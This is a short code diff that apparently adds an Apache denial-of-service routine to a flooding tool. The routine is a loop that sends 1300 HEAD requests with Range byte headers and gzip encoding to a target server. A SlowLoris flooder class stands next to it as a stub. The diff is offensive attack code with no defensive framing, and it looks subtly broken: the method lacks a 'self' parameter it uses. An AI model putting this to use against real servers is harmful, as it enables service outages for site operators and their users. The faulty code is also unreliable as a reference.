@@ -39,9 +39,10 @@ class KillApache(Flooder):
     def kill_apache():
         sock = self.socket()
         sock.connect(self.target)
-        data = ''
-        sock.send(data)
-        
+        for n in range(1300):
+            data = 'HEAD / HTTP/1.1\r\nHost: %s\r\nRange:bytes=0-%d\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n' % (self.target[0],n)
+            sock.send(data)
+        sock.close()
 
 class SlowLoris(Flooder):
     pass
